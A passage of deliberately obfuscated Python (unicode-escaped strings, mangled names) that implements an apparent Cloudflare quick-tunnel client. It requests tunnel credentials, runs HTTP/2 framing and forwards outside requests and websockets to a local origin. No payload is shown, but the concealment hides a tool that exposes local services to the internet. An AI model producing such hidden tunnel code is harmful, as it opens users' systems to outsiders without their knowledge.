codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u006d\\u0061\\u0070', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0077\\u0061\\u0073\\u006d', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0068\\u0074\\u006d', 'unicode_escape'): codecs.decode('\\u0074\\u0065\\u0078\\u0074\\u002f\\u0068\\u0074\\u006d\\u006c\\u003b\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u003d\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u002e\\u0073\\u0076\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0078\\u006d\\u006c', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0078\\u006d\\u006c', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'): codecs.decode('\\u0066\\u006f\\u006e\\u0074\\u002f\\u0077\\u006f\\u0066\\u0066\\u0032', 'unicode_escape'), codecs.decode('\\u002e\\u0070\\u006e\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0070\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u006a\\u0070\\u0065\\u0067', 'unicode_escape'), codecs.decode('\\u002e\\u0067\\u0069\\u0066', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0067\\u0069\\u0066', 'unicode_escape'), codecs.decode('\\u002e\\u0069\\u0063\\u006f', 'unicode_escape'): codecs.decode('\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0078\\u002d\\u0069\\u0063\\u006f\\u006e', 'unicode_escape')}.get(O0_var_597, codecs.decode('', 'unicode_escape'))

def O0_fn_16(O0_var_598):
    if isinstance(O0_var_598, list):
        return bytes(O0_var_598)
    if not isinstance(O0_var_598, str):
        raise ValueError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u006e\\u0020\\u0075\\u006e\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'))
    return base64.b64decode(O0_var_598 + codecs.decode('\\u003d', 'unicode_escape') * (-len(O0_var_598) % 4))

def O0_fn_17(O0_var_599):
    request = urllib.request.Request(O0_var_599.rstrip(codecs.decode('\\u002f', 'unicode_escape')) + codecs.decode('\\u002f\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape'), data=b'', method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape'), headers={codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0070\\u0079\\u002f\\u0031\\u002e\\u0030', 'unicode_escape')})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            O0_var_600 = response.read()
            O0_var_601 = response.status
    except urllib.error.URLError as exc:
        raise RuntimeError(codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0069\\u006e\\u0067\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    try:
        O0_var_602 = json.loads(O0_var_600)
    except json.JSONDecodeError as exc:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0065\\u0064\\u0020\\u006e\\u006f\\u006e\\u002d\\u004a\\u0053\\u004f\\u004e\\u0020\\u0028\\u0025\\u0073\\u0029\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_601, O0_var_600[:300].decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')))) from exc
    O0_var_603 = O0_var_602.get(codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape')) or {}
    if not O0_var_602.get(codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), True) or not O0_var_603:
        raise RuntimeError(codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0077\\u0061\\u0073\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % json.dumps(O0_var_602.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape')), ensure_ascii=False))
    try:
        O0_var_604 = uuid.UUID(O0_var_603[codecs.decode('\\u0069\\u0064', 'unicode_escape')])
        O0_var_605 = O0_var_603[codecs.decode('\\u0061\\u0063\\u0063\\u006f\\u0075\\u006e\\u0074\\u005f\\u0074\\u0061\\u0067', 'unicode_escape')]
        O0_var_606 = O0_fn_16(O0_var_603[codecs.decode('\\u0073\\u0065\\u0063\\u0072\\u0065\\u0074', 'unicode_escape')])
        O0_var_607 = O0_var_603[codecs.decode('\\u0068\\u006f\\u0073\\u0074\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')]
    except (KeyError, ValueError, binascii.Error, TypeError) as exc:
        raise RuntimeError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0071\\u0075\\u0069\\u0063\\u006b\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
    return (O0_var_607, O0_var_605, O0_var_606, O0_var_604.bytes)

class H2Connection:

    def __init__(self, O0_var_608, O0_var_609, O0_var_610, O0_var_611, O0_var_612, O0_var_613, logger, O0_var_614=None, O0_var_615=False, O0_var_616=None):
        self.sock = O0_var_608
        self.origin = O0_var_609
        self.account_tag = O0_var_610
        self.tunnel_secret = O0_var_611
        self.tunnel_id = O0_var_612
        self.conn_index = O0_var_613
        self.log = logger
        self.tunnel_url = O0_var_614
        self.show_tunnel = O0_var_615
        self.tunnel_state = O0_var_616 if O0_var_616 is not None else {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}
        self.decoder = HpackDecoder()
        self.encoder_lock = threading.Lock()
        self.window_condition = threading.Condition()
        self.connection_window = 65535
        self.stream_windows = {}
        self.peer_max_frame = MAX_FRAME_SIZE
        self.streams = {}
        self.control = None
        self.stopped = False
        self.registered = False

    def send_frame(self, O0_var_617, O0_var_618, O0_var_619, O0_var_620=b''):
        if len(O0_var_620) > 16777215:
            raise ValueError(codecs.decode('\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))
        O0_var_621 = struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), len(O0_var_620))[1:] + bytes((O0_var_617, O0_var_618)) + struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_619 & 2147483647)
        with self.encoder_lock:
            self.sock.sendall(O0_var_621 + O0_var_620)

    def send_headers(self, O0_var_622, headers, O0_var_623=False):
        O0_var_624 = O0_fn_8(headers)
        O0_var_625 = 4 | (1 if O0_var_623 else 0)
        self.send_frame(1, O0_var_625, O0_var_622, O0_var_624)

    def send_data(self, O0_var_626, O0_var_627, O0_var_628=False):
        O0_var_629 = memoryview(O0_var_627)
        O0_var_630 = 0
        while O0_var_630 < len(O0_var_629) or (len(O0_var_629) == 0 and O0_var_630 == 0):
            with self.window_condition:
                while self.connection_window <= 0 or self.stream_windows.get(O0_var_626, 65535) <= 0:
                    if self.stopped:
                        return
                    self.window_condition.wait(1)
                O0_var_631 = min(len(O0_var_629) - O0_var_630, self.connection_window, self.stream_windows.get(O0_var_626, 65535), self.peer_max_frame)
                if len(O0_var_629) == 0:
                    O0_var_631 = 0
                O0_var_632 = bytes(O0_var_629[O0_var_630:O0_var_630 + O0_var_631])
                self.connection_window -= O0_var_631
                self.stream_windows[O0_var_626] = self.stream_windows.get(O0_var_626, 65535) - O0_var_631
            O0_var_633 = 1 if O0_var_628 and O0_var_630 + O0_var_631 >= len(O0_var_629) else 0
            self.send_frame(0, O0_var_633, O0_var_626, O0_var_632)
            O0_var_630 += O0_var_631
            if len(O0_var_629) == 0:
                break

    def send_window_update(self, O0_var_634, O0_var_635):
        if O0_var_635 > 0:
            self.send_frame(8, 0, O0_var_634, struct.pack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_635 & 2147483647))

    def read_frame(self):
        O0_var_636 = O0_fn_21(self.sock, 9)
        O0_var_637 = int.from_bytes(O0_var_636[:3], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_638, O0_var_639 = (O0_var_636[3], O0_var_636[4])
        O0_var_640 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_636[5:])[0] & 2147483647
        O0_var_641 = O0_fn_21(self.sock, O0_var_637)
        return (O0_var_638, O0_var_639, O0_var_640, O0_var_641)

    def read_headers(self, O0_var_642, O0_var_643, O0_var_644):
        if O0_var_642 & 8:
            O0_var_645 = O0_var_644[0]
            O0_var_644 = O0_var_644[1:]
            if O0_var_645 > len(O0_var_644):
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
            O0_var_644 = O0_var_644[:-O0_var_645] if O0_var_645 else O0_var_644
        if O0_var_642 & 32:
            O0_var_644 = O0_var_644[5:]
        O0_var_646 = [O0_var_644]
        while not O0_var_642 & 4:
            O0_var_647, O0_var_648, O0_var_649, O0_var_650 = self.read_frame()
            if O0_var_647 != 9 or O0_var_649 != O0_var_643:
                raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0043\\u004f\\u004e\\u0054\\u0049\\u004e\\u0055\\u0041\\u0054\\u0049\\u004f\\u004e\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065', 'unicode_escape'))
            O0_var_646.append(O0_var_650)
            O0_var_642 = O0_var_648
        return self.decoder.decode(b''.join(O0_var_646))

    def open_control(self, O0_var_651):
        if self.control is not None:
            return
        self.control = ControlStream(self, O0_var_651, self.log)
        self.send_headers(O0_var_651, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'))])
        self.control.start(self.account_tag, self.tunnel_secret, self.tunnel_id, self.conn_index)

    def update_config(self, O0_var_652, body):
        O0_var_653 = 0
        try:
            O0_var_653 = int(json.loads(body or b'{}').get(codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), 0))
        except (ValueError, TypeError, json.JSONDecodeError):
            pass
        response = json.dumps({codecs.decode('\\u006c\\u0061\\u0074\\u0065\\u0073\\u0074\\u0041\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_653}, separators=(codecs.decode('\\u002c', 'unicode_escape'), codecs.decode('\\u003a', 'unicode_escape'))).encode()
        self.send_headers(O0_var_652, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), str(len(response)))])
        self.send_data(O0_var_652, response, True)

    def request_finished(self, O0_var_654, request):
        if request.get(codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape')) == codecs.decode('\\u0075\\u0070\\u0064\\u0061\\u0074\\u0065\\u002d\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u0075\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'):
            self.update_config(O0_var_654, bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')):
            return
        if request.get(codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')):
            return
        request[codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape')] = True
        threading.Thread(target=self.proxy_request, args=(O0_var_654, request), daemon=True).start()

    def proxy_request(self, O0_var_655, request):
        try:
            response = O0_fn_20(self.origin, request[codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')], request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')], bytes(request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]))
            O0_var_656 = response[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]
            O0_var_657 = []
            O0_var_658 = []
            for O0_var_659, O0_var_660 in O0_var_656:
                O0_var_661 = O0_var_659.lower()
                if O0_var_661 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_658.append((O0_var_661, O0_var_660))
                if not (O0_var_661.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_661.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_661.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_661.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_661 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_657.append((O0_var_661, O0_var_660))
            if not any((O0_var_659 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape') for O0_var_659, O0_var_662 in O0_var_657)):
                O0_var_663 = O0_fn_15(request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')])
                if O0_var_663:
                    O0_var_657.append((codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), O0_var_663))
            O0_var_664 = O0_fn_18(O0_var_657)
            O0_var_665 = 200 if response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == 101 else response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
            O0_var_666 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_665))]
            O0_var_666.extend(O0_var_658)
            O0_var_666.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_664))
            O0_var_666.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.send_headers(O0_var_655, O0_var_666)
            while True:
                O0_var_667 = response[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].read(65536)
                if not O0_var_667:
                    self.send_data(O0_var_655, b'', True)
                    break
                self.send_data(O0_var_655, O0_var_667, False)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_655, exc)
            try:
                self.send_headers(O0_var_655, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass

    def run(self):
        O0_var_668 = O0_fn_21(self.sock, 24)
        if O0_var_668 != b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n':
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0065\\u006e\\u0064\\u0020\\u0074\\u0068\\u0065\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0063\\u006c\\u0069\\u0065\\u006e\\u0074\\u0020\\u0070\\u0072\\u0065\\u0066\\u0061\\u0063\\u0065', 'unicode_escape'))
        self.send_frame(4, 0, 0, struct.pack(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), 3, 100))
        if self.show_tunnel and (not self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')]):
            print(self.tunnel_url, flush=True)
            self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')] = True
        while not self.stopped:
            O0_var_669, O0_var_670, O0_var_671, O0_var_672 = self.read_frame()
            if O0_var_669 == 4:
                if not O0_var_670 & 1:
                    if len(O0_var_672) % 6:
                        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0053\\u0045\\u0054\\u0054\\u0049\\u004e\\u0047\\u0053\\u0020\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
                    for O0_var_673 in range(0, len(O0_var_672), 6):
                        O0_var_674, O0_var_675 = struct.unpack_from(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), O0_var_672, O0_var_673)
                        if O0_var_674 == 4:
                            O0_var_676 = O0_var_675 - 65535
                            for O0_var_677 in self.stream_windows:
                                self.stream_windows[O0_var_677] = max(0, self.stream_windows[O0_var_677] + O0_var_676)
                        elif O0_var_674 == 5 and 16384 <= O0_var_675 <= 16777215:
                            self.peer_max_frame = O0_var_675
                    self.send_frame(4, 1, 0)
                continue
            if O0_var_669 == 6:
                if not O0_var_670 & 1:
                    self.send_frame(6, 1, 0, O0_var_672)
                continue
            if O0_var_669 == 8:
                if len(O0_var_672) != 4:
                    continue
                O0_var_678 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_672)[0] & 2147483647
                if O0_var_671 == 0:
                    with self.window_condition:
                        self.connection_window += O0_var_678
                        self.window_condition.notify_all()
                else:
                    with self.window_condition:
                        self.stream_windows[O0_var_671] = self.stream_windows.get(O0_var_671, 65535) + O0_var_678
                        self.window_condition.notify_all()
                continue
            if O0_var_669 == 3:
                self.streams.pop(O0_var_671, None)
                continue
            if O0_var_669 == 7:
                break
            if O0_var_669 == 1:
                O0_var_679 = self.read_headers(O0_var_670, O0_var_671, O0_var_672)
                self.stream_windows.setdefault(O0_var_671, 65535)
                self.handle_headers(O0_var_671, O0_var_670, O0_var_679)
                continue
            if O0_var_669 == 0:
                self.handle_data(O0_var_671, O0_var_670, O0_var_672)
                continue

    def handle_headers(self, O0_var_680, O0_var_681, headers):
        O0_var_682 = {}
        for O0_var_683, O0_var_684 in headers:
            if O0_var_683.startswith(codecs.decode('\\u003a', 'unicode_escape')):
                O0_var_682[O0_var_683] = O0_var_684
            else:
                O0_var_682[O0_var_683.lower()] = O0_var_684
        O0_var_685 = O0_var_682.get(CONTROL_HEADER, codecs.decode('', 'unicode_escape')).strip().lower()
        if O0_var_685 == CONTROL_STREAM:
            self.open_control(O0_var_680)
            if O0_var_681 & 1:
                self.control.finished = True
            return
        request = {codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'): O0_var_682.get(codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_682.get(codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'): O0_var_682.get(codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): [(O0_var_683, O0_var_684) for O0_var_683, O0_var_684 in headers if not O0_var_683.startswith(codecs.decode('\\u003a', 'unicode_escape'))], codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): bytearray(), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'): O0_var_685, codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): O0_var_685 == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape') or O0_var_682.get(codecs.decode('\\u003a\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower() == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape'): bool(O0_var_681 & 1), codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'): False}
        self.streams[O0_var_680] = request
        if request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')] = WebSocketProxy(self, O0_var_680, request, self.origin, self.log)
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].start()
        elif request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')]:
            self.request_finished(O0_var_680, request)

    def handle_data(self, O0_var_686, O0_var_687, O0_var_688):
        self.send_window_update(0, len(O0_var_688))
        self.send_window_update(O0_var_686, len(O0_var_688))
        if self.control is not None and self.control.stream_id == O0_var_686:
            self.control.feed(O0_var_688)
            if O0_var_687 & 1:
                self.control.finished = True
            return
        request = self.streams.get(O0_var_686)
        if request is None:
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')) is not None:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].feed(O0_var_688, bool(O0_var_687 & 1))
            return
        request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].extend(O0_var_688)
        if O0_var_687 & 1:
            request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')] = True
            self.request_finished(O0_var_686, request)

class WebSocketProxy:

    def __init__(self, O0_var_689, O0_var_690, request, O0_var_691, logger):
        self.connection = O0_var_689
        self.stream_id = O0_var_690
        self.request = request
        self.origin = O0_var_691
        self.log = logger
        self.incoming = queue.Queue()
        self.stopped = threading.Event()
        self.sock = None

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def feed(self, O0_var_692, O0_var_693=False):
        if O0_var_692:
            self.incoming.put(O0_var_692)
        if O0_var_693:
            self.incoming.put(None)

    def run(self):
        O0_var_694 = None
        try:
